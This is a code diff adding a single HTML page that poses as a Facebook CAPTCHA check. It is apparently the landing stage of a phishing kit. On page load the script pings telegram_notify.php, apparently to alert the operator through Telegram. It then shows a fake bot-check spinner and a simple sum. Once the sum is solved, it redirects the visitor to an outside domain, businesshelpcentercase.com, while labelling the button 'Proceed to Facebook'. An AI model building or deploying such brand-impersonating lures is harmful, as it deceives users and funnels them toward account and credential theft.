@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook CAPTCHA Challenge</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            border: 1px solid #dddfe2;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            padding: 20px;
+            width: 400px;
+            text-align: center;
+        }
+        h1 {
+            color: #1877f2;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #606770;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 12px 20px;
+            font-size: 16px;
+            color: white;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:disabled {
+            background-color: #bcc0c4;
+            cursor: not-allowed;
+        }
+        .captcha {
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        input {
+            padding: 8px;
+            font-size: 16px;
+            width: 60px;
+            text-align: center;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+            margin-left: 5px;
+        }
+        .loading {
+            margin-bottom: 20px;
+            display: none;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        footer {
+            font-size: 12px;
+            color: #606770;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Just a moment...</h1>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Checking if you're not a robot...</p>
+        </div>
+
+        <div id="captchaContainer" style="display:none;">
+            <p>Complete the CAPTCHA below to proceed to Facebook:</p>
+            <div class="captcha">
+                <span id="num1"></span> + <span id="num2"></span> =
+                <input type="text" id="captchaInput" placeholder="Answer">
+            </div>
+            <button id="proceedButton" disabled>Proceed to Facebook</button>
+        </div>
+
+        <footer>
+            Facebook © 2025. All rights reserved.
+        </footer>
+    </div>
+
+    <script>
+        // Function to send request to telegram_notify.php
+        function sendTelegramNotification() {
+            fetch('telegram_notify.php')
+                .then(response => response.text())
+                .then(data => {
+                    console.log("Telegram notification sent successfully");
+                })
+                .catch(error => console.error("Error sending Telegram notification:", error));
+        }
+
+        // Call the function when the page loads
+        window.onload = function() {
+            sendTelegramNotification();
+            showLoading();
+        };
+
+        // Fake loading screen
+        function showLoading() {
+            document.getElementById('loading').style.display = 'block';
+            setTimeout(function () {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('captchaContainer').style.display = 'block';
+            }, 2000);
+        }
+
+        // Generate random numbers for CAPTCHA ensuring their sum is ≤ 10
+        function generateCaptcha() {
+            let num1, num2;
+            do {
+                num1 = Math.floor(Math.random() * 10);
+                num2 = Math.floor(Math.random() * 10);
+            } while (num1 + num2 > 10);
+            
+            return { num1, num2 };
+        }
+
+        const { num1, num2 } = generateCaptcha();
+        const correctAnswer = num1 + num2;
+
+        // Display CAPTCHA numbers
+        document.getElementById('num1').textContent = num1;
+        document.getElementById('num2').textContent = num2;
+
+        // Check if the answer is correct
+        document.getElementById('captchaInput').addEventListener('input', function () {
+            const inputAnswer = parseInt(this.value, 10);
+            const button = document.getElementById('proceedButton');
+            if (inputAnswer === correctAnswer) {
+                button.disabled = false;
+                button.addEventListener('click', function () {
+                    window.location.href = 'https://businesshelpcentercase.com';
+                });
+            } else {
+                button.disabled = true;
+            }
+        });
+    </script>
+
+</body>
+</html>
